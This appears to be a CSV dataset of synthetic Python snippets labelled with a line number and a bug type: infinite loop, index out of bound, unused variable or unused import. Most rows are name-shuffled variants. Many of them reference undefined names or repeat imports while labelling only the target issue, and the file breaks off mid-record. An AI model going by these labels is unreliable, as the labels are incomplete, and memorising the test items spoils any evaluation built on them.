input,output
"l = [1,2,3,4]
for i in l:
    l.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   fh = [1, 2, 3, 4]
2   for bar in fh:
3       fh.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   reduce = [1, 2, 3, 4]
2   for dmin in reduce:
3       reduce.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   DISCRETE_KINDS = [1, 2, 3, 4]
2   for dataspace_is_numerical in DISCRETE_KINDS:
3       DISCRETE_KINDS.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   SECONDS = [1, 2, 3, 4]
2   for domain in SECONDS:
3       SECONDS.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   self = [1, 2, 3, 4]
2   for minor_breaks in self:
3       self.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   _trans = [1, 2, 3, 4]
2   for timedelta_format in _trans:
3       _trans.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   NANOSECONDS = [1, 2, 3, 4]
2   for lru_cache in NANOSECONDS:
3       NANOSECONDS.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   OrderedDict = [1, 2, 3, 4]
2   for logit_trans in OrderedDict:
3       OrderedDict.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   v1 = [1, 2, 3, 4]
2   for abstractmethod in v1:
3       v1.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   dmin = [1, 2, 3, 4]
2   for span in dmin:
3       dmin.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   trans_minor_breaks = [1, 2, 3, 4]
2   for _get in trans_minor_breaks:
3       trans_minor_breaks.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   log10_trans = [1, 2, 3, 4]
2   for nomatch in log10_trans:
3       log10_trans.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   trans_new = [1, 2, 3, 4]
2   for num2date in trans_new:
3       trans_new.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   min_max = [1, 2, 3, 4]
2   for args in min_max:
3       min_max.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   n = [1, 2, 3, 4]
2   for delta in n:
3       n.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   min_max = [1, 2, 3, 4]
2   for _format in min_max:
3       min_max.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   v2 = [1, 2, 3, 4]
2   for _x in v2:
3       v2.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   abstractmethod = [1, 2, 3, 4]
2   for i in abstractmethod:
3       abstractmethod.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   b = [1, 2, 3, 4]
2   for extended_breaks in b:
3       b.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   v2_indices = [1, 2, 3, 4]
2   for _trans in v2_indices:
3       v2_indices.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   user_input = [1, 2, 3, 4]
2   for log10_trans in user_input:
3       user_input.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   ABC = [1, 2, 3, 4]
2   for finite in ABC:
3       ABC.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   attr = [1, 2, 3, 4]
2   for func in attr:
3       attr.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   numbers = [1, 2, 3, 4]
2   for _get in numbers:
3       numbers.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   vmin = [1, 2, 3, 4]
2   for obj in vmin:
3       vmin.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   dataspace_is_numerical = [1, 2, 3, 4]
2   for lru_cache in dataspace_is_numerical:
3       dataspace_is_numerical.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   var = [1, 2, 3, 4]
2   for limits in var:
3       var.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   ABC = [1, 2, 3, 4]
2   for chain in ABC:
3       ABC.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   transform = [1, 2, 3, 4]
2   for DISCRETE_KINDS in transform:
3       transform.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   CONTINUOUS_KINDS = [1, 2, 3, 4]
2   for lru_cache in CONTINUOUS_KINDS:
3       CONTINUOUS_KINDS.append(1)
",3 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   num2date = [1, 2, 3, 4]
5   for name in num2date:
6       num2date.append(1)
7   import datetime
8   na_rm: str = i.date.today().strftime('%y-%m-%d')
",6 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   timedelta_format = [1, 2, 3, 4]
4   for attr in timedelta_format:
5       timedelta_format.append(1)
6   import datetime
7   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   a = [1, 2, 3, 4]
4   for n in a:
5       a.append(1)
6   import datetime
7   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   tz = [1, 2, 3, 4]
4   for fh in tz:
5       tz.append(1)
6   import datetime
7   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   d = [1, 2, 3, 4]
4   for finite in d:
5       d.append(1)
6   import datetime
7   obj: str = d.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   num2date = [1, 2, 3, 4]
4   for breaks_ in num2date:
5       num2date.append(1)
6   import datetime
7   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   f = [1, 2, 3, 4]
4   for contents in f:
5       f.append(1)
6   import datetime
7   v2: str = args.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   p = [1, 2, 3, 4]
4   for probability_trans in p:
5       p.append(1)
6   import datetime
7   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   span = [1, 2, 3, 4]
4   for b in span:
5       span.append(1)
6   import datetime
7   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   timedelta_format = [1, 2, 3, 4]
4   for finite in timedelta_format:
5       timedelta_format.append(1)
6   import datetime
7   v1: str = log_format.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   log2_trans = [1, 2, 3, 4]
4   for trans_minor_breaks in log2_trans:
5       log2_trans.append(1)
6   import datetime
7   v2: str = c.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   bar = [1, 2, 3, 4]
4   for abstractmethod in bar:
5       bar.append(1)
6   import datetime
7   func: str = v1.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   Foo = [1, 2, 3, 4]
4   for kwargs in Foo:
5       Foo.append(1)
6   import datetime
7   v: str = contents.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   breaks_ = [1, 2, 3, 4]
4   for base in breaks_:
5       breaks_.append(1)
6   import datetime
7   c: str = transform.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   value = [1, 2, 3, 4]
4   for _format in value:
5       value.append(1)
6   import datetime
7   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",5 - infinite loop: iterable changed while iterating over it
"numbers = [10, 20, 30]
numbers[4]",2 - error: index out of bound
"1   extended_breaks = [10, 20, 30]
2   extended_breaks[4]
",2 - error: index out of bound
"1   vmin = [10, 20, 30]
2   vmin[4]
",2 - error: index out of bound
"1   obj = [10, 20, 30]
2   obj[4]
",2 - error: index out of bound
"1   foo = [10, 20, 30]
2   foo[4]
",2 - error: index out of bound
"1   timedelta_format = [10, 20, 30]
2   timedelta_format[4]
",2 - error: index out of bound
"1   name = [10, 20, 30]
2   name[4]
",2 - error: index out of bound
"1   probability_trans = [10, 20, 30]
2   probability_trans[4]
",2 - error: index out of bound
"1   current_date = [10, 20, 30]
2   current_date[4]
",2 - error: index out of bound
"1   value = [10, 20, 30]
2   value[4]
",2 - error: index out of bound
"1   limits = [10, 20, 30]
2   limits[4]
",2 - error: index out of bound
"1   MethodType = [10, 20, 30]
2   MethodType[4]
",2 - error: index out of bound
"1   SECONDS = [10, 20, 30]
2   SECONDS[4]
",2 - error: index out of bound
"1   v1_to_v2_map = [10, 20, 30]
2   v1_to_v2_map[4]
",2 - error: index out of bound
"1   var = [10, 20, 30]
2   var[4]
",2 - error: index out of bound
"1   na_rm = [10, 20, 30]
2   na_rm[4]
",2 - error: index out of bound
"1   skip = [10, 20, 30]
2   skip[4]
",2 - error: index out of bound
"1   p = [10, 20, 30]
2   p[4]
",2 - error: index out of bound
"1   foo = [10, 20, 30]
2   foo[4]
",2 - error: index out of bound
"1   klass_name = [10, 20, 30]
2   klass_name[4]
",2 - error: index out of bound
"1   probit_trans = [10, 20, 30]
2   probit_trans[4]
",2 - error: index out of bound
"1   domain = [10, 20, 30]
2   domain[4]
",2 - error: index out of bound
"1   date2num = [10, 20, 30]
2   date2num[4]
",2 - error: index out of bound
"1   log10_trans = [10, 20, 30]
2   log10_trans[4]
",2 - error: index out of bound
"1   domain = [10, 20, 30]
2   domain[4]
",2 - error: index out of bound
"1   f = [10, 20, 30]
2   f[4]
",2 - error: index out of bound
"1   minor_breaks = [10, 20, 30]
2   minor_breaks[4]
",2 - error: index out of bound
"1   breaks = [10, 20, 30]
2   breaks[4]
",2 - error: index out of bound
"1   delta = [10, 20, 30]
2   delta[4]
",2 - error: index out of bound
"1   v1 = [10, 20, 30]
2   v1[4]
",2 - error: index out of bound
"1   probit_trans = [10, 20, 30]
2   probit_trans[4]
",2 - error: index out of bound
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   log_trans = [10, 20, 30]
5   log_trans[4]
6   import datetime
7   na_rm: str = i.date.today().strftime('%y-%m-%d')
",5 - error: index out of bound
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   minor_breaks = [10, 20, 30]
4   minor_breaks[4]
5   import datetime
6   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   np = [10, 20, 30]
4   np[4]
5   import datetime
6   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   d = [10, 20, 30]
4   d[4]
5   import datetime
6   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   incomparables = [10, 20, 30]
4   incomparables[4]
5   import datetime
6   obj: str = d.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   v1 = [10, 20, 30]
4   v1[4]
5   import datetime
6   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   logit_trans = [10, 20, 30]
4   logit_trans[4]
5   import datetime
6   v2: str = args.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   skip = [10, 20, 30]
4   skip[4]
5   import datetime
6   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   domain = [10, 20, 30]
4   domain[4]
5   import datetime
6   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   value = [10, 20, 30]
4   value[4]
5   import datetime
6   v1: str = log_format.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   msg = [10, 20, 30]
4   msg[4]
5   import datetime
6   v2: str = c.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   incomparables = [10, 20, 30]
4   incomparables[4]
5   import datetime
6   func: str = v1.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   trans = [10, 20, 30]
4   trans[4]
5   import datetime
6   v: str = contents.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   span = [10, 20, 30]
4   span[4]
5   import datetime
6   c: str = transform.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   BaseClass = [10, 20, 30]
4   BaseClass[4]
5   import datetime
6   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",4 - error: index out of bound
"x = 1
y = None
print(x)
",2 - warning: unused variable
"1   args = 1
2   date_format = None
3   print(args)
",2 - warning: unused variable
"1   na_rm = 1
2   n = None
3   print(na_rm)
",2 - warning: unused variable
"1   vmin = 1
2   reduce = None
3   print(vmin)
",2 - warning: unused variable
"1   val = 1
2   domain = None
3   print(val)
",2 - warning: unused variable
"1   log_trans = 1
2   dmax = None
3   print(log_trans)
",2 - warning: unused variable
"1   v2_indices = 1
2   obj = None
3   print(v2_indices)
",2 - warning: unused variable
"1   trans = 1
2   log_breaks = None
3   print(trans)
",2 - warning: unused variable
"1   accuracy = 1
2   DISCRETE_KINDS = None
3   print(accuracy)
",2 - warning: unused variable
"1   MethodType = 1
2   date_breaks = None
3   print(MethodType)
",2 - warning: unused variable
"1   doc = 1
2   fh = None
3   print(doc)
",2 - warning: unused variable
"1   transform = 1
2   print_values_but_five = None
3   print(transform)
",2 - warning: unused variable
"1   file_path = 1
2   incomparables = None
3   print(file_path)
",2 - warning: unused variable
"1   print_values_but_five = 1
2   d = None
3   print(print_values_but_five)
",2 - warning: unused variable
"1   aesthetic = 1
2   _x = None
3   print(aesthetic)
",2 - warning: unused variable
"1   log10_trans = 1
2   val = None
3   print(log10_trans)
",2 - warning: unused variable
"1   value = 1
2   MSG = None
3   print(value)
",2 - warning: unused variable
"1   domain = 1
2   klass_name = None
3   print(domain)
",2 - warning: unused variable
"1   ABC = 1
2   contents = None
3   print(ABC)
",2 - warning: unused variable
"1   breaks = 1
2   contents = None
3   print(breaks)
",2 - warning: unused variable
"1   vmax = 1
2   _trans = None
3   print(vmax)
",2 - warning: unused variable
"1   pd = 1
2   value = None
3   print(pd)
",2 - warning: unused variable
"1   nearest_int = 1
2   start = None
3   print(nearest_int)
",2 - warning: unused variable
"1   log_format = 1
2   dataspace_is_numerical = None
3   print(log_format)
",2 - warning: unused variable
"1   zero_range = 1
2   log10_trans = None
3   print(zero_range)
",2 - warning: unused variable
"1   np = 1
2   _x = None
3   print(np)
",2 - warning: unused variable
"1   log_format = 1
2   NANOSECONDS = None
3   print(log_format)
",2 - warning: unused variable
"1   SECONDS = 1
2   finite = None
3   print(SECONDS)
",2 - warning: unused variable
"1   span = 1
2   start = None
3   print(span)
",2 - warning: unused variable
"1   self = 1
2   base = None
3   print(self)
",2 - warning: unused variable
"1   _get = 1
2   aesthetic = None
3   print(_get)
",2 - warning: unused variable
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   c = 1
5   var = None
6   print(c)
7   import datetime
8   na_rm: str = i.date.today().strftime('%y-%m-%d')
",5 - warning: unused variable
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   v1_to_v2_map = 1
4   log_format = None
5   print(v1_to_v2_map)
6   import datetime
7   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   MSG = 1
4   abstractmethod = None
5   print(MSG)
6   import datetime
7   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   OrderedDict = 1
4   domain = None
5   print(OrderedDict)
6   import datetime
7   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   var = 1
4   transform = None
5   print(var)
6   import datetime
7   obj: str = d.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   bar = 1
4   i = None
5   print(bar)
6   import datetime
7   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   msg = 1
4   c = None
5   print(msg)
6   import datetime
7   v2: str = args.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   n = 1
4   skip = None
5   print(n)
6   import datetime
7   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   c = 1
4   func = None
5   print(c)
6   import datetime
7   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   mpl_format = 1
4   abstractmethod = None
5   print(mpl_format)
6   import datetime
7   v1: str = log_format.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   y = 1
4   cdists = None
5   print(y)
6   import datetime
7   v2: str = c.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   date_breaks = 1
4   types = None
5   print(date_breaks)
6   import datetime
7   func: str = v1.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   n = 1
4   skip = None
5   print(n)
6   import datetime
7   v: str = contents.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   kwargs = 1
4   zero_range = None
5   print(kwargs)
6   import datetime
7   c: str = transform.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"1   import datetime
2   c: str = transform.date.today().strftime('%y-%m-%d')
3   __all__ = 1
4   v2_indices = None
5   print(__all__)
6   import datetime
7   reduce: str = BaseClass.date.today().strftime('%y-%m-%d')
",4 - warning: unused variable
"from functools import lru_cache, reduce


def foo(data):
    return reduce(lambda x, y: x + y, data)


print(foo([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return distribution(lambda x, y: MethodType + breaks_, timedelta_breaks)
5   print(types([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return print_values_but_five(lambda x, y: a + log2_trans, aesthetic)
5   print(timedelta_breaks([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return CONTINUOUS_KINDS(lambda x, y: log_format + c, attr)
5   print(log2_trans([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return aesthetic(lambda x, y: accuracy + a, v)
5   print(file_path([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return t(lambda x, y: num2date + DISCRETE_KINDS, trans)
5   print(_format([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return num2date(lambda x, y: start + np, pd)
5   print(value([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return log2_trans(lambda x, y: nomatch + fh, min_max)
5   print(data([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return date_breaks(lambda x, y: _x + self, dataspace_is_numerical)
5   print(f([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return aesthetic(lambda x, y: vmax + contents, Foo)
5   print(rng([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return lru_cache(lambda x, y: t + var, var)
5   print(var([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return vmin(lambda x, y: domain + dmin, file_path)
5   print(ABC([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return v1(lambda x, y: dmin + CONTINUOUS_KINDS, b)
5   print(reduce([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return SECONDS(lambda x, y: CONTINUOUS_KINDS + klass_name, transform)
5   print(log_format([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return v1(lambda x, y: types + dataspace_is_numerical, b)
5   print(span([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return nomatch(lambda x, y: dmin + timedelta_format, data)
5   print(finite([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return OrderedDict(lambda x, y: file_path + dataspace_is_numerical, date_format)
5   print(limits([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return defaultdict(lambda x, y: contents + dmin, v1_to_v2_map)
5   print(start([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return date_breaks(lambda x, y: start + lru_cache, log2_trans)
5   print(print_values_but_five([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return breaks(lambda x, y: val + np, p)
5   print(datetime([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return user_input(lambda x, y: v2_indices + defaultdict, a)
5   print(lru_cache([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return pd(lambda x, y: timedelta_breaks + na_rm, trans_new)
5   print(__all__([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return stats(lambda x, y: Foo + fh, distribution)
5   print(lru_cache([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return args(lambda x, y: mpl_format + dmin, Iterator)
5   print(numbers([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return v2(lambda x, y: trans_minor_breaks + trans, v)
5   print(trans([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return v(lambda x, y: timedelta_format + vmax, finite)
5   print(obj([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return chain(lambda x, y: b + probability_trans, lru_cache)
5   print(dmin([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return trans(lambda x, y: num2date + log_trans, d)
5   print(v([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return bar(lambda x, y: cdists + datetime, sys)
5   print(inverse([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return v1(lambda x, y: k + t, timedelta_breaks)
5   print(CONTINUOUS_KINDS([1, 2, 3, 4]))
",1 - warning: unused import
"1   from functools import lru_cache, reduce
2   
3   def foo(data):
4       return fh(lambda x, y: c + SECONDS, kwargs)
5   print(BaseClass([1, 2, 3, 4]))
",1 - warning: unused import
"1   import datetime
2   
3   current_date: str = datetime.date.today().strftime(""%y-%m-%d"")
4   from functools import lru_cache, reduce
5   
6   def foo(data):
7       return na_rm(lambda x, y: value + defaultdict, b)
8   print(bar([1, 2, 3, 4]))
9   import datetime
10   na_rm: str = i.date.today().strftime('%y-%m-%d')
",4 - warning: unused import
"1   import datetime
2   na_rm: str = i.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return trans_new(lambda x, y: minor_breaks + timedelta_format, probit_trans)
7   print(BaseClass([1, 2, 3, 4]))
8   import datetime
9   incomparables: str = skip.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   incomparables: str = skip.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return Iterator(lambda x, y: args + n, myint)
7   print(vmax([1, 2, 3, 4]))
8   import datetime
9   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   attr: str = minor_breaks.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return trans_new(lambda x, y: probit_trans + domain, msg)
7   print(klass_name([1, 2, 3, 4]))
8   import datetime
9   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   inverse: str = OrderedDict.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return domain(lambda x, y: defaultdict + domain, abstractmethod)
7   print(extended_breaks([1, 2, 3, 4]))
8   import datetime
9   obj: str = d.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   obj: str = d.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return num2date(lambda x, y: base + np, msg)
7   print(na_rm([1, 2, 3, 4]))
8   import datetime
9   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   probability_trans: str = obj.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return probability_trans(lambda x, y: data + span, chain)
7   print(delta([1, 2, 3, 4]))
8   import datetime
9   v2: str = args.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   v2: str = args.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return nearest_int(lambda x, y: min_max + _x, t)
7   print(accuracy([1, 2, 3, 4]))
8   import datetime
9   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   log10_trans: str = incomparables.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return v1_to_v2_map(lambda x, y: OrderedDict + i, breaks_)
7   print(abstractmethod([1, 2, 3, 4]))
8   import datetime
9   na_rm: str = doc.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   na_rm: str = doc.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return timedelta_breaks(lambda x, y: start + v2_indices, v)
7   print(foo([1, 2, 3, 4]))
8   import datetime
9   v1: str = log_format.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   v1: str = log_format.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return Foo(lambda x, y: v2_indices + datetime, item)
7   print(SECONDS([1, 2, 3, 4]))
8   import datetime
9   v2: str = c.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   v2: str = c.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return _get(lambda x, y: chain + v, probit_trans)
7   print(func([1, 2, 3, 4]))
8   import datetime
9   func: str = v1.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   func: str = v1.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return min_max(lambda x, y: print_values_but_five + incomparables, a)
7   print(doc([1, 2, 3, 4]))
8   import datetime
9   v: str = contents.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
2   v: str = contents.date.today().strftime('%y-%m-%d')
3   from functools import lru_cache, reduce
4   
5   def foo(data):
6       return trans_new(lambda x, y: var + num2date, kwargs)
7   print(fh([1, 2, 3, 4]))
8   import datetime
9   c: str = transform.date.today().strftime('%y-%m-%d')
",3 - warning: unused import
"1   import datetime
